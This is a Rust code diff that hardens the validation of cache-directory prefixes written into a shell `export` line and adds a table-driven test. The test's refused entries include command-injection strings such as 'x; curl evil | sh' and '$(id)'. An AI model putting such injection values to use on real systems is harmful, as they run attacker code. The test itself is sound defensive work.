@@ -116,10 +116,10 @@ impl SetupForPackages {
                     let entry = entry.as_map().unwrap();
                     let env_var = entry.get("env_var").unwrap().as_string().unwrap().clone();
                     let prefix = entry.get("prefix").unwrap().as_string().unwrap().clone();
-                    // the prefix is joined onto the state dir and sent to the
-                    // shell helpers: one directory name only. This is the one
-                    // prefix check here; `is_state_prefix` applies
-                    // `mfile::File::validate_state_component` first.
+                    // The prefix is joined onto the state dir and printed by
+                    // the shell helpers in an `export` line, so it must be one
+                    // directory name in the set `is_state_prefix` allows. That
+                    // check includes `mfile::File::validate_state_component`.
                     if !mfile::is_state_prefix(&prefix) {
                         return Err(std::io::Error::new(
                             std::io::ErrorKind::InvalidData,
@@ -518,21 +518,177 @@ mod tests {
             );
         }
 
-        // the rule itself, at its edges
-        for ok in ["gocache", "go-mod_cache.v2", "..."] {
-            assert!(mfile::is_state_prefix(ok), "{ok}");
-        }
-        for bad in [
-            "", ".", "..", "a/b", "/abs", "a\0b", "a\\b", "a:b", "a\nb", "a\rb", "a\tb",
-            "a\u{7f}b", "a\u{85}b", "a\u{9f}b",
-        ] {
-            assert!(!mfile::is_state_prefix(bad), "{bad:?}");
-        }
+        // the name rule at its edges; the prefix rule's list is
+        // `STATE_PREFIXES`, checked by `the_prefix_rule_and_the_contract_agree`
         for ok in ["GOCACHE", "_x", "a1"] {
             assert!(is_valid_env_var_name(ok), "{ok}");
         }
         for bad in ["", "1a", "a-b", "a b", "a[0]", "a=b", "é"] {
             assert!(!is_valid_env_var_name(bad), "{bad:?}");
+        }
+    }
+
+    /// Prefixes, and whether a package may declare each. The accepted ones
+    /// begin with every prefix the package tree declares today. The refused
+    /// ones cover each class of character the set leaves out: a path, the
+    /// helper's line framing, a control character, non-ASCII, and each
+    /// character a shell reads as syntax in the printed `export` line.
+    const STATE_PREFIXES: &[(&str, bool)] = &[
+        // the package tree's prefixes
+        ("actions-runner", true),
+        ("bun-cache", true),
+        ("cargo", true),
+        ("deno-cache", true),
+        ("gocache", true),
+        ("gomodcache", true),
+        ("gradle", true),
+        ("jbang", true),
+        ("maven", true),
+        ("mvnd", true),
+        ("npm-cache", true),
+        ("uv-cache", true),
+        ("zig-cache", true),
+        ("zig-global-cache", true),
+        // the rest of the set, at its edges
+        ("go-mod_cache.v2", true),
+        ("UPPER9", true),
+        ("...", true),
+        ("-x", true),
+        // a path, or not one name
+        ("", false),
+        (".", false),
+        ("..", false),
+        ("a/b", false),
+        ("/abs", false),
+        ("cache/artifacts", false),
+        // the helper's line framing
+        ("a:b", false),
+        ("a\\b", false),
+        // control characters: C0, DEL, C1
+        ("a\0b", false),
+        ("a\nb", false),
+        ("a\rb", false),
+        ("a\tb", false),
+        ("a\u{1b}[2Jb", false),
+        ("a\u{7f}b", false),
+        ("a\u{85}b", false),
+        ("a\u{9f}b", false),
+        // non-ASCII
+        ("cach\u{e9}", false),
+        ("a\u{a0}b", false),
+        // shell syntax in `export GOCACHE=/state/<prefix>`
+        ("x; curl evil | sh", false),
+        ("a b", false),
+        ("a;b", false),
+        ("a|b", false),
+        ("a&b", false),
+        ("a$(id)", false),
+        ("a${HOME}", false),
+        ("a$b", false),
+        ("a`id`", false),
+        ("a>b", false),
+        ("a<b", false),
+        ("a(b)", false),
+        ("a{b,c}", false),
+        ("a*", false),
+        ("a?", false),
+        ("a[b]", false),
+        ("~a", false),
+        ("a'b", false),
+        ("a\"b", false),
+        ("a#b", false),
+        ("a=b", false),
+        ("a!b", false),
+        ("a%b", false),
+    ];
+
+    /// `s` as a Nickel string literal that evaluates to `s` exactly.
+    fn nickel_string(s: &str) -> String {
+        let mut out = String::from("\"");
+        for c in s.chars() {
+            match c {
+                '\\' => out.push_str("\\\\"),
+                '"' => out.push_str("\\\""),
+                '%' => out.push_str("\\%"),
+                // `\u{1b}`, which is Nickel's escape too
+                c if c.is_control() => out.extend(c.escape_unicode()),
+                c => out.push(c),
+            }
+        }
+        out.push('"');
+        out
+    }
+
+    /// Loads a one-package layer whose wiring has `prefix`, through
+    /// `BuildSpec`'s attrs contract. A refusal comes back as the report a
+    /// person reads.
+    fn load_with_prefix(prefix: &str) -> Result<Layer, String> {
+        Layer::new_for_test(format!(
+            "let {{BuildSpec, ..}} = import \"minimal.ncl\" in\n\
+             {{ name = \"p\", build_deps = [], cmd = \"\", \
+             attrs.env_state_wiring = [{{ env_var = \"GOCACHE\", prefix = {} }}] }} | BuildSpec\n",
+            nickel_string(prefix)
+        ))
+        .map_err(|e| {
+            let mut buf = codespan_reporting::term::termcolor::NoColor::new(Vec::new());
+            e.report_to(&mut buf);
+            String::from_utf8_lossy(&buf.into_inner()).into_owned()
+        })
+    }
+
+    /// The daemon's prefix rule (`mfile::is_state_prefix`) and the Nickel
+    /// contract on `env_state_wiring` accept and refuse the same prefixes.
+    /// An accepted one loads and becomes `/state/<prefix>`; a refused one is
+    /// refused at load by the prefix rule's own message, and again by the
+    /// graph for a spec that no contract checked.
+    #[test]
+    fn the_prefix_rule_and_the_contract_agree() {
+        for &(prefix, accepted) in STATE_PREFIXES {
+            assert_eq!(mfile::is_state_prefix(prefix), accepted, "rule: {prefix:?}");
+            match (load_with_prefix(prefix), accepted) {
+                (Ok(layer), true) => {
+                    let g = Graph::new().ingest(layer).unwrap();
+                    let setup = SetupForPackages::build(&g, [g.by_name("p").unwrap()])
+                        .unwrap_or_else(|e| panic!("{prefix:?}: {e}"));
+                    assert_eq!(
+                        setup.env_vars.get("GOCACHE"),
+                        Some(&format!("/state/{prefix}")),
+                        "{prefix:?}"
+                    );
+                }
+                (Err(report), true) => panic!("contract refused {prefix:?}:\n{report}"),
+                (Ok(_), false) => panic!("contract accepted {prefix:?}"),
+                (Err(report), false) => assert!(
+                    report.contains("env_state_wiring's prefix must be one directory name"),
+                    "{prefix:?} was refused for another reason:\n{report}"
+                ),
+            }
+
+            let mut g = Graph::new();
+            let b1 = g.insert_build(BuildSpec {
+                name: "b1".into(),
+                attrs: IndexMap::from_iter([(
+                    "env_state_wiring".to_string(),
+                    decode::AttrValue::Map(IndexMap::from_iter([
+                        (
+                            "env_var".to_string(),
+                            decode::AttrValue::String("GOCACHE".to_string(), None),
+                        ),
+                        (
+                            "prefix".to_string(),
+                            decode::AttrValue::String(prefix.to_string(), None),
+                        ),
+                    ])),
+                )]),
+                ..Default::default()
+            });
+            match SetupForPackages::build(&g, [&b1]) {
+                Ok(_) => assert!(accepted, "graph accepted {prefix:?}"),
+                Err(e) => {
+                    assert!(!accepted, "graph refused {prefix:?}: {e}");
+                    assert_eq!(e.to_string(), mfile::state_prefix_refusal("b1", prefix));
+                }
+            }
         }
     }
 
